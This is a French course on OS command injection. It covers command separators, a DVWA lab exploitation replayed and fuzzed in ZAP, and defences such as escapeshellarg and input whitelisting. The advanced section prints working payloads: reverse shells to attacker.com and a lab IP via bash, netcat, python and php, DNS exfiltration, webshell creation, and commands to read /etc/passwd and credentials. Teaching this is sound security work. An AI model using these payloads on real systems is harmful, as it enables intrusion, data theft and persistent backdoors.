# Cours : Command Injection (OS Command Injection)

## Introduction

Cette section couvre :
- **Command Injection** : Vulnérabilité permettant d'exécuter des commandes système arbitraires [invicti](https://www.invicti.com/blog/web-security/command-injection-vulnerability)
- **Exploitation via champs de saisie** : Abus des inputs qui exécutent des commandes locales [pentesterworld](https://pentesterworld.com/exercise/exercise-48-command-injection-via-input-fields/)
- **Séparateurs de commandes** : Techniques d'enchaînement (`;`, `&&`, `||`, `|`)  [github](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)
- **DVWA Command Injection Demo** : Exploitation pratique [faresbltagy.gitbook](https://faresbltagy.gitbook.io/footprintinglabs/sans-sec504-and-labs/book-four/command-injection)
- **Documentation dans ZAP** : Créer des alertes pour les vulnérabilités trouvées

***

## Partie 1 : Command Injection - Concepts fondamentaux

### 1.1 Définition

**OS Command Injection** (aussi appelé **Shell Injection**) : Vulnérabilité de sécurité web qui permet à un attaquant d'exécuter des **commandes système arbitraires** sur le serveur hébergeant l'application. [systemweakness](https://systemweakness.com/command-injection-how-exploiting-user-input-can-lead-to-full-system-compromise-6becf5b981a1?gi=30cbac3e2a23)

**Cause** : L'application passe des **données utilisateur non sanitisées** directement à un shell système (bash, sh, cmd.exe). [invicti](https://www.invicti.com/blog/web-security/command-injection-vulnerability)

**Impact**  : [github](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)
- 🔴 **Compromission totale du serveur** : Lecture de fichiers sensibles, modification de données, création de backdoors
- 🔴 **Escalade de privilèges** : Si l'application tourne en root/admin
- 🔴 **Exfiltration de données** : Vol de bases de données, credentials
- 🔴 **Déni de service** : Arrêt du système, suppression de fichiers critiques
- 🔴 **Pivot vers le réseau interne** : Attaque d'autres machines du réseau

**OWASP Top 10** : Fait partie de "A03:2021 – Injection" (très critique).

### 1.2 Comment fonctionne Command Injection

**Scénario classique** : Application web avec fonctionnalité "Ping". [pentesterworld](https://pentesterworld.com/exercise/exercise-48-command-injection-via-input-fields/)

**Code PHP vulnérable**  : [pentesterworld](https://pentesterworld.com/exercise/exercise-48-command-injection-via-input-fields/)
```php
<?php
// Récupérer l'adresse IP de l'utilisateur
$ip = $_GET['ip'];

// Exécuter la commande ping SANS validation
$output = shell_exec("ping -c 4 " . $ip);

// Afficher le résultat
echo "<pre>$output</pre>";
?>
```

**Utilisation légitime** :
```
URL: http://example.com/ping.php?ip=192.168.1.1

Commande exécutée: ping -c 4 192.168.1.1

Résultat:
PING 192.168.1.1 (192.168.1.1) 56(84) bytes of data.
64 bytes from 192.168.1.1: icmp_seq=1 ttl=64 time=0.456 ms
...
```

**Exploitation malveillante**  : [github](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)
```
URL: http://example.com/ping.php?ip=192.168.1.1; cat /etc/passwd

Commande exécutée: ping -c 4 192.168.1.1; cat /etc/passwd

Résultat:
PING 192.168.1.1 ... (résultat du ping)
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
```

**Explication**  : [github](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)
- `;` sépare les commandes en bash
- `ping -c 4 192.168.1.1` s'exécute en premier
- `cat /etc/passwd` s'exécute ensuite
- L'attaquant voit le contenu de `/etc/passwd`

### 1.3 Fonctions vulnérables (selon le langage)

**PHP**  : [invicti](https://www.invicti.com/blog/web-security/command-injection-vulnerability)
```php
system()         // Exécute et affiche
exec()           // Exécute et retourne dernière ligne
shell_exec()     // Exécute et retourne sortie complète
passthru()       // Exécute et affiche sortie binaire
popen()          // Ouvre un processus
proc_open()      // Ouvre un processus avancé
`commande`       // Backticks (équivalent à shell_exec)
```

**Python** :
```python
os.system()
os.popen()
subprocess.call()
subprocess.Popen()
eval()  # Si utilisé avec input() non validé
```

**Node.js** :
```javascript
child_process.exec()
child_process.execSync()
child_process.spawn()
```

**Java** :
```java
Runtime.getRuntime().exec()
ProcessBuilder
```

***

## Partie 2 : Séparateurs de commandes et techniques d'injection

### 2.1 Séparateurs de commandes Unix/Linux

**Tableau des séparateurs**  : [github](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)

| Séparateur | Nom | Comportement | Exemple |
|------------|-----|--------------|---------|
| `;` | Semicolon | Exécute séquentiellement | `cmd1; cmd2` |
| `&&` | AND | cmd2 seulement si cmd1 réussit | `cmd1 && cmd2` |
| `\|\|` | OR | cmd2 seulement si cmd1 échoue | `cmd1 \|\| cmd2` |
| `&` | Background | cmd1 en arrière-plan | `cmd1 & cmd2` |
| `\|` | Pipe | Sortie cmd1 → Entrée cmd2 | `cmd1 \| cmd2` |
| Newline | Nouvelle ligne | Exécute séquentiellement | `cmd1\ncmd2` |

#### a) Semicolon (`;`) - Exécution séquentielle [github](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)

**Syntaxe** :
```bash
command1; command2
```

**Comportement** : Exécute `command1`, puis `command2` **peu importe le résultat** de `command1`.

**Exemple** :
```bash
# Terminal
ping -c 1 192.168.1.1; ls -la

# Résultat:
# 1. Ping de 192.168.1.1
# 2. Liste des fichiers (même si le ping échoue)
```

**Payload injection** :
```
192.168.1.1; cat /etc/passwd
192.168.1.1; whoami
192.168.1.1; ls /var/www/html
```

#### b) AND (`&&`) - Exécution conditionnelle (succès) [github](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)

**Syntaxe** :
```bash
command1 && command2
```

**Comportement** : Exécute `command2` **seulement si** `command1` réussit (exit code 0).

**Exemple** :
```bash
# Terminal
ping -c 1 192.168.1.1 && echo "Ping successful"

# Si ping réussit → Affiche "Ping successful"
# Si ping échoue → N'affiche rien
```

**Payload injection** :
```
192.168.1.1 && cat /etc/passwd
# cat s'exécute seulement si le ping réussit
```

**Usage pentest** : Utile quand on veut garantir que la commande précédente fonctionne.

#### c) OR (`||`) - Exécution conditionnelle (échec)  [github](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)

**Syntaxe** :
```bash
command1 || command2
```

**Comportement** : Exécute `command2` **seulement si** `command1` échoue (exit code ≠ 0).

**Exemple** :
```bash
# Terminal
ping -c 1 192.168.999.999 || echo "Ping failed"

# Si ping échoue → Affiche "Ping failed"
# Si ping réussit → N'affiche rien
```

**Payload injection** :
```
invalidhost || cat /etc/passwd
# cat s'exécute seulement si le ping échoue
```

#### d) Background (`&`) - Exécution en arrière-plan [github](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)

**Syntaxe** :
```bash
command1 & command2
```

**Comportement** : Exécute `command1` en arrière-plan, puis `command2` immédiatement.

**Exemple** :
```bash
# Terminal
sleep 60 & echo "Sleep started"

# Résultat immédiat: "Sleep started"
# sleep 60 continue en arrière-plan
```

**Payload injection** :
```
192.168.1.1 & nc -e /bin/bash attacker.com 4444
# Reverse shell en arrière-plan pendant que ping s'exécute
```

#### e) Pipe (`|`) - Redirection de sortie  [github](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)

**Syntaxe** :
```bash
command1 | command2
```

**Comportement** : Sortie de `command1` devient l'entrée de `command2`.

**Exemple** :
```bash
# Terminal
cat /etc/passwd | grep root

# Résultat: Seulement les lignes contenant "root"
```

**Payload injection** :
```
192.168.1.1 | cat /etc/passwd
# Sortie du ping ignorée, cat s'exécute
```

#### f) Newline (`\n`) - Nouvelle ligne [github](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)

**Syntaxe** :
```bash
command1
command2
```

**Comportement** : Exécute séquentiellement (comme `;`).

**Payload injection (URL encoded)** :
```
192.168.1.1%0Acat /etc/passwd
# %0A = newline en URL encoding
```

### 2.2 Séparateurs Windows (cmd.exe)

| Séparateur | Comportement |
|------------|--------------|
| `&` | Séquentiel (comme `;` sous Linux) |
| `&&` | AND (comme Linux) |
| `\|\|` | OR (comme Linux) |
| `\|` | Pipe (comme Linux) |

**Exemple Windows** :
```cmd
ping 192.168.1.1 & dir C:\
ping 192.168.1.1 && type C:\Windows\System32\drivers\etc\hosts
```

### 2.3 Autres techniques d'injection

#### a) Substitution de commande [github](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)

**Syntaxe** :
```bash
$(command)     # Moderne
`command`      # Ancien (backticks)
```

**Exemple** :
```bash
echo "Hostname: $(hostname)"
# Résultat: Hostname: webserver01
```

**Payload injection** :
```
192.168.1.1 $(cat /etc/passwd)
192.168.1.1 `whoami`
```

#### b) Redirection vers fichier [github](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)

**Syntaxe** :
```bash
command > fichier     # Écrase
command >> fichier    # Ajoute
```

**Payload injection (webshell)** :
```bash
# Créer un webshell PHP
192.168.1.1; echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php

# Accès:
http://target.com/shell.php?cmd=whoami
```

#### c) Brace Expansion [github](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)

**Syntaxe** :
```bash
{command1,command2}
```

**Exemple** :
```bash
{ls,-la}
# Équivalent à: ls -la
```

**Payload injection (bypass filters)** :
```bash
{,cat,/etc/passwd}
# Équivalent à: cat /etc/passwd
```

***

## Partie 3 : DVWA Command Injection - Exploitation (Security: Low)

### 3.1 Configuration de l'environnement

**Lancer DVWA** :
```bash
# Docker
docker run -d -p 8001:80 vulnerables/web-dvwa

# Accès
http://localhost:8001
# OU
http://servertcm:8001
```

**Connexion** :
```
Username: admin
Password: password
```

**Configuration** :
```
1. DVWA Security → Set to "Low"
2. Create / Reset Database (si nécessaire)
3. Menu → Command Injection
```

### 3.2 Interface de Command Injection

**Page DVWA** :
```
┌────────────────────────────────────┐
│  Ping a device                     │
│                                    │
│  Enter an IP address:              │
│  [ 192.168.1.1        ] [Submit]   │
│                                    │
└────────────────────────────────────┘
```

**Code PHP sous-jacent (Security: Low)**  : [faresbltagy.gitbook](https://faresbltagy.gitbook.io/footprintinglabs/sans-sec504-and-labs/book-four/command-injection)
```php
<?php
if (isset($_POST['ip'])) {
    $target = $_REQUEST['ip'];
    
    // Déterminer l'OS
    if (stristr(php_uname('s'), 'Windows NT')) {
        $cmd = shell_exec('ping ' . $target);
    } else {
        $cmd = shell_exec('ping -c 4 ' . $target);
    }
    
    echo "<pre>{$cmd}</pre>";
}
?>
```

**Analyse** : Aucune validation ! `$target` est directement injecté dans `shell_exec()`.

### 3.3 Test légitime

**Input** :
```
192.168.1.48
```

**Résultat** :
```
PING 192.168.1.48 (192.168.1.48) 56(84) bytes of data.
64 bytes from 192.168.1.48: icmp_seq=1 ttl=64 time=0.234 ms
64 bytes from 192.168.1.48: icmp_seq=2 ttl=64 time=0.198 ms
64 bytes from 192.168.1.48: icmp_seq=3 ttl=64 time=0.211 ms
64 bytes from 192.168.1.48: icmp_seq=4 ttl=64 time=0.187 ms

--- 192.168.1.48 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3062ms
rtt min/avg/max/mdev = 0.187/0.207/0.234/0.021 ms
```

**Commande exécutée sur le serveur** :
```bash
ping -c 4 192.168.1.48
```

### 3.4 Exploitation : Exécuter des commandes arbitraires

#### Payload 1 : Lister les fichiers (`ls -la`)

**Input** :
```
192.168.1.48; ls -la
```

**Commande exécutée** :
```bash
ping -c 4 192.168.1.48; ls -la
```

**Résultat** :
```
PING 192.168.1.48 ... (résultat du ping)

total 148
drwxr-xr-x  8 www-data www-data  4096 May 11 21:00 .
drwxr-xr-x  3 root     root      4096 Jan  1 00:00 ..
-rw-r--r--  1 www-data www-data  1234 May 11 20:55 config.inc.php
-rw-r--r--  1 www-data www-data  5678 May 11 20:55 index.php
drwxr-xr-x  2 www-data www-data  4096 May 11 20:55 vulnerabilities
...
```

**Succès** : Liste des fichiers affichée ! ✅

#### Payload 2 : Lire `/etc/passwd`

**Input** :
```
192.168.1.48; cat /etc/passwd
```

**Résultat** :
```
PING 192.168.1.48 ...

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mysql:x:999:999::/home/mysql:/bin/sh
```

**Succès** : Usernames système récupérés ! ✅

#### Payload 3 : Identifier l'utilisateur courant (`whoami`)

**Input** :
```
192.168.1.48; whoami
```

**Résultat** :
```
PING 192.168.1.48 ...

www-data
```

**Information** : L'application tourne avec les privilèges de `www-data`.

#### Payload 4 : Localiser le répertoire actuel (`pwd`)

**Input** :
```
192.168.1.48; pwd
```

**Résultat** :
```
PING 192.168.1.48 ...

/var/www/html/vulnerabilities/exec
```

#### Payload 5 : Lire la configuration DVWA

**Input** :
```
192.168.1.48; cat /var/www/html/config/config.inc.php
```

**Résultat** :
```php
<?php
$_DVWA['db_server']   = 'localhost';
$_DVWA['db_database'] = 'dvwa';
$_DVWA['db_user']     = 'root';
$_DVWA['db_password'] = 'password';
?>
```

**Succès** : Credentials de base de données exposés ! 🔴

### 3.5 Exploitation via ZAP (Replay Attack)

**Workflow** :

#### Étape 1 : Capturer la requête légitime

```
1. ZAP proxy activé
2. DVWA → Command Injection
3. Soumettre : 192.168.1.48
4. ZAP → Onglet "History" → Trouver la requête POST
```

**Requête capturée** :
```http
POST /vulnerabilities/exec/ HTTP/1.1
Host: servertcm:8001
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=abc123; security=low

ip=192.168.1.48&Submit=Submit
```

#### Étape 2 : Modifier la requête

```
1. Clic droit sur la requête → Open/Resend with Request Editor...
2. Modifier le body :
   ip=192.168.1.48; ls -la&Submit=Submit
3. Send
```

**Requête modifiée** :
```http
POST /vulnerabilities/exec/ HTTP/1.1
Host: servertcm:8001
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=abc123; security=low

ip=192.168.1.48; ls -la&Submit=Submit
```

#### Étape 3 : Observer la réponse

**Onglet "Response"** :
```html
<pre>
PING 192.168.1.48 ...

total 148
drwxr-xr-x  8 www-data www-data  4096 May 11 21:00 .
...
</pre>
```

**Succès** : Commande injectée exécutée ! ✅

#### Étape 4 : Automatiser avec Fuzzer

```
1. Sélectionner la requête
2. Clic droit → Fuzz...
3. Highlight "192.168.1.48" dans le body
4. Add... → Type: Strings
5. Ajouter des payloads :
   - 192.168.1.48; whoami
   - 192.168.1.48; cat /etc/passwd
   - 192.168.1.48; cat /var/www/html/config/config.inc.php
   - 192.168.1.48; uname -a
6. Start Fuzzer
```

**Résultat** : Toutes les commandes exécutées automatiquement.

### 3.6 Documenter dans ZAP : Créer une alerte

**Workflow**  : [infosecinstitute](https://www.infosecinstitute.com/resources/secure-coding/command-injection-vulnerabilities-exploitation-case-study/)

```
1. ZAP → History
2. Sélectionner la requête avec injection réussie
   (ex: ip=192.168.1.48; ls -la)
3. Clic droit → New Alert...
4. Configuration :
   
   Name: OS Command Injection
   
   Risk: High
   
   Confidence: Confirmed
   
   Description:
   The application executes arbitrary OS commands supplied via the 'ip' 
   parameter without validation. An attacker can execute any command with 
   the privileges of the web server (www-data).
   
   URL: http://servertcm:8001/vulnerabilities/exec/
   
   Parameter: ip
   
   Attack: 192.168.1.48; cat /etc/passwd
   
   Evidence: 
   root:x:0:0:root:/root:/bin/bash
   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
   ...
   
   Solution:
   - Implement strict input validation (whitelist of valid IP addresses)
   - Avoid using shell_exec(), use safer alternatives
   - If shell commands necessary, use escapeshellarg()
   - Apply principle of least privilege (run app with minimal permissions)
   
   CWE ID: 78 (OS Command Injection)
   WASC ID: 31 (OS Commanding)
   
5. Save
```

**Résultat** : L'alerte apparaît dans :
- ZAP → Alerts tab
- Rapports générés (HTML/XML/JSON)

**Export du rapport** :
```
1. ZAP → Report → Generate HTML Report...
2. Enregistrer : dvwa_command_injection_report.html
3. Ouvrir dans un navigateur pour révision
```

***

## Partie 4 : Exploitation avancée

### 4.1 Reverse Shell

**Objectif** : Obtenir un shell interactif sur le serveur.

**Préparation (machine attaquante)** :
```bash
# Lancer un listener Netcat
nc -lvnp 4444

# -l : Listen
# -v : Verbose
# -n : No DNS
# -p : Port 4444
```

**Payload** :
```
192.168.1.48; bash -c 'bash -i >& /dev/tcp/192.168.1.50/4444 0>&1'
```

**Alternative (si bash non disponible)** :
```
# Netcat
192.168.1.48; nc -e /bin/bash 192.168.1.50 4444

# Python
192.168.1.48; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.50",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

# PHP
192.168.1.48; php -r '$sock=fsockopen("192.168.1.50",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
```

**Résultat (machine attaquante)** :
```bash
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.1.100 54321
www-data@webserver:/var/www/html/vulnerabilities/exec$
```

**Shell interactif obtenu** ! 🎯

### 4.2 Exfiltration de données via DNS

**Scénario** : Firewall bloque les connexions sortantes HTTP/TCP, mais autorise DNS. [github](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)

**Service** : dnsbin.zhack.ca

**Payload** :
```bash
192.168.1.48; for i in $(ls /); do host "$i.YOUR_UNIQUE_ID.d.zhack.ca"; done
```

**Exemple** :
```bash
# Lister les fichiers du répertoire racine via DNS
192.168.1.48; for i in $(ls /var/www/html); do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

**Résultat** : Les requêtes DNS vers `config.3a43c7e4e57a8d0e2057.d.zhack.ca`, `index.3a43c7e4e57a8d0e2057.d.zhack.ca` sont capturées par dnsbin.

**Consulter** : https://dnsbin.zhack.ca (voir les requêtes reçues).

### 4.3 Créer un webshell persistant

**Payload** :
```
192.168.1.48; echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php
```

**Accès au webshell** :
```
http://servertcm:8001/shell.php?cmd=whoami
http://servertcm:8001/shell.php?cmd=ls -la
http://servertcm:8001/shell.php?cmd=cat /etc/passwd
```

**Webshell amélioré** :
```bash
192.168.1.48; echo '<?php if(isset($_GET["cmd"])){echo "<pre>";system($_GET["cmd"]);echo "</pre>";} ?>' > /var/www/html/sh.php
```

### 4.4 Élévation de privilèges

**Vérifier sudo** :
```
192.168.1.48; sudo -l
```

**Résultat possible** :
```
User www-data may run the following commands:
    (ALL) NOPASSWD: /usr/bin/python3
```

**Exploitation** :
```
192.168.1.48; sudo /usr/bin/python3 -c 'import os; os.system("/bin/bash")'
```

**Rechercher binaires SUID** :
```
192.168.1.48; find / -perm -4000 2>/dev/null
```

***

## Partie 5 : Protections contre Command Injection

### 5.1 Éviter les commandes shell [invicti](https://www.invicti.com/blog/web-security/command-injection-vulnerability)

**Mauvais** :
```php
$ip = $_GET['ip'];
$output = shell_exec("ping -c 4 " . $ip);
```

**Bon** : Utiliser des fonctions natives  : [pentesterworld](https://pentesterworld.com/exercise/exercise-48-command-injection-via-input-fields/)
```php
$ip = $_GET['ip'];

// Validation
if (!filter_var($ip, FILTER_VALIDATE_IP)) {
    die("Invalid IP address");
}

// Utiliser fsockopen au lieu de ping
if ($fp = @fsockopen($ip, 80, $errno, $errstr, 5)) {
    echo "Host is reachable";
    fclose($fp);
} else {
    echo "Host is unreachable";
}
```

### 5.2 Validation stricte (Whitelist) [invicti](https://www.invicti.com/blog/web-security/command-injection-vulnerability)

**Regex pour IP valide** :
```php
$ip = $_GET['ip'];

// Whitelist : Seulement les adresses IP valides
if (!preg_match('/^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/', $ip)) {
    die("Invalid IP format");
}

// Vérifier plages valides
if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
    die("Invalid IP address");
}

$output = shell_exec("ping -c 4 " . escapeshellarg($ip));
```

### 5.3 Échappement des caractères spéciaux [pentesterworld](https://pentesterworld.com/exercise/exercise-48-command-injection-via-input-fields/)

**PHP** :
```php
$ip = $_GET['ip'];

// Échapper TOUS les caractères shell
$safe_ip = escapeshellarg($ip);

// Maintenant sûr
$output = shell_exec("ping -c 4 " . $safe_ip);
```

**Résultat avec payload malveillant** :
```php
Input: 192.168.1.1; cat /etc/passwd
escapeshellarg() → '192.168.1.1; cat /etc/passwd'

Commande finale: ping -c 4 '192.168.1.1; cat /etc/passwd'
Erreur: ping: unknown host 192.168.1.1; cat /etc/passwd
```

**Avantage** : Le `;` est traité comme partie du nom d'hôte, pas comme séparateur.

### 5.4 Désactiver les fonctions dangereuses [pentesterworld](https://pentesterworld.com/exercise/exercise-48-command-injection-via-input-fields/)

**php.ini** :
```ini
disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source
```

**Redémarrer Apache** :
```bash
sudo systemctl restart apache2
```

### 5.5 Principe du moindre privilège

**Mauvais** : Serveur web tourne en root
```bash
ps aux | grep apache2
root     1234  ... /usr/sbin/apache2
```

**Bon** : Serveur web tourne avec utilisateur dédié
```bash
ps aux | grep apache2
www-data 1234  ... /usr/sbin/apache2
```

**Configuration Apache** (`/etc/apache2/envvars`) :
```bash
export APACHE_RUN_USER=www-data
export APACHE_RUN_GROUP=www-data
```

### 5.6 Utiliser des API sécurisées

**Python** :
```python
import subprocess

# Mauvais
os.system("ping " + user_input)

# Bon (liste d'arguments)
subprocess.run(["ping", "-c", "4", user_input], capture_output=True)
```

**Avantage** : `user_input` est traité comme un argument unique, pas interprété par le shell.

***

## Résumé : Points clés à retenir

1. **Command Injection** : Exécution de commandes OS arbitraires via inputs non sanitisés [systemweakness](https://systemweakness.com/command-injection-how-exploiting-user-input-can-lead-to-full-system-compromise-6becf5b981a1?gi=30cbac3e2a23)
2. **Cause** : Passage de données utilisateur à `shell_exec()`, `system()`, `exec()` [invicti](https://www.invicti.com/blog/web-security/command-injection-vulnerability)
3. **Impact** : Compromission totale du serveur, exfiltration de données, reverse shell [systemweakness](https://systemweakness.com/command-injection-how-exploiting-user-input-can-lead-to-full-system-compromise-6becf5b981a1?gi=30cbac3e2a23)
4. **Séparateur `;`** : Exécute commandes séquentiellement (ping; ls) [github](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)
5. **Séparateur `&&`** : Exécute cmd2 si cmd1 réussit [github](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)
6. **Séparateur `||`** : Exécute cmd2 si cmd1 échoue  [github](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)
7. **Séparateur `|`** : Pipe output cmd1 vers cmd2  [github](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)
8. **DVWA Low Security** : Aucune validation, injection directe [faresbltagy.gitbook](https://faresbltagy.gitbook.io/footprintinglabs/sans-sec504-and-labs/book-four/command-injection)
9. **ZAP Replay** : Modifier requête capturée pour rejouer avec payload [infosecinstitute](https://www.infosecinstitute.com/resources/secure-coding/command-injection-vulnerabilities-exploitation-case-study/)
10. **ZAP Alert** : Documenter comme "OS Command Injection, High Risk, Confirmed" [infosecinstitute](https://www.infosecinstitute.com/resources/secure-coding/command-injection-vulnerabilities-exploitation-case-study/)
11. **Protection** : Validation stricte (whitelist IP), escapeshellarg(), éviter shell commands [invicti](https://www.invicti.com/blog/web-security/command-injection-vulnerability)
12. **Désactivation** : disable_functions dans php.ini [pentesterworld](https://pentesterworld.com/exercise/exercise-48-command-injection-via-input-fields/)
13. **Least Privilege** : Serveur web ne doit JAMAIS tourner en root
14. **Reverse Shell** : bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1' [pentesterworld](https://pentesterworld.com/exercise/exercise-48-command-injection-via-input-fields/)
15. **Webshell** : echo '<?php system($_GET["cmd"]); ?>' > shell.php [github](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)
